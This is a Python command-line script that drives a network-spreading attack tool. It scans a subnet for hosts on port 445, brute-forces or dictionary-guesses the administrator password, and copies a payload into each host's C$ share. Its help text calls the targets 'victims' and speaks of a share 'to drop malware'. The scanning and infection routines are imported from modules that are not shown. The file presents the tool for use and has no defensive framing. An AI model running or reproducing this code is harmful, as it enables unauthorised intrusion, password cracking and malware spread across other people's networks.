#! /usr/bin/env python

from time import time
from argparse import ArgumentParser
from generators import generate_hashes, generate_credentials
from hosts import scan_hosts


def log(v_count, message):
    if options.verbosity >= v_count:
        print(message)


def log_v(message):
    log(1, message)


def log_vv(message):
    log(2, message)


def log_vvv(message):
    log(3, message)


def trace_when(v_count):
    def deco(func):
        def inner(*args, **kwargs):
            start = time()
            result = func(*args, **kwargs)
            end = time()
            log(v_count, '$ Time elapsed: {0} seconds\n'.format(end - start))
            return result

        return inner

    return deco


@trace_when(v_count=1)
def scan():
    log_v('$ Scanning hosts...')
    hosts = scan_hosts(options.target, options.port)

    if len(hosts) > 0:
        for host in hosts:
            log_vv(host)
    else:
        log_v('$ No hosts up.')

    return hosts


@trace_when(v_count=1)
def infect():
    password_generator = generate_credentials(options.user, options.dictionary, options.alphabet, options.min,
                                              options.max, log_vvv)
    hosts = scan()

    if len(hosts) > 0:
        for host in hosts:
            log_v('$ Connecting to host {0}...'.format(host.ip))
            host.infect(password_generator, options.share, options.input, options.output)
            log_vv(host)


@trace_when(v_count=1)
def build():
    log_v('$ Building hashes...')
    hashes = generate_hashes(options.input, options.alphabet, options.min, options.max, log_vv)

    with open(options.output, 'w') as f:
        for i, data in enumerate(hashes):
            if i - 1 < options.count:
                f.write('{0}\n'.format(data))
            else:
                break


def run():
    parser = ArgumentParser()
    parser.add_argument('command', help='interaction with specified hosts/subnet victims', default='scan', choices=[
        'build',
        'scan',
        'infect'
    ])
    parser.add_argument('-i', '--input', help='source file path')
    parser.add_argument('-o', '--output', help='destination file path')

    parser.add_argument('-d', '--dictionary', help='attack of either type pass|hash + dictionary file path', nargs=2)
    parser.add_argument('-b', '--bruteforce', help='use brute force for password guessing', action='store_true')

    parser.add_argument('-c', '--count', help='number of hashes to generate', type=int, default=1000000)
    parser.add_argument('-n', '--min', help='minimum number characters in password', type=int, default=4)
    parser.add_argument('-x', '--max', help='maximum number characters in password', type=int, default=6)
    parser.add_argument('-a', '--alphabet', help='alphabet of allowed characters without spaces',
                        default='abcdefghijklmnopqrstuvwxyz0123456789')

    parser.add_argument('-t', '--target', help='target hosts/subnet e.g. 192.168.2.10, 192.168.2.0/24')
    parser.add_argument('-p', '--port', help='target port e.g. 139', default=445)
    parser.add_argument('-u', '--user', help='target username to use for authentication', default='administrator')
    parser.add_argument('-s', '--share', help='target share name to drop malware', default='C$')

    parser.add_argument('-v', '--verbosity', action='count', default=0)

    global options
    options = parser.parse_args()

    switcher = {
        'build': lambda: build(),
        'scan': lambda: scan(),
        'infect': lambda: infect()
    }
    func = switcher.get(options.command, lambda: None)
    func()


if __name__ == '__main__':
    run()
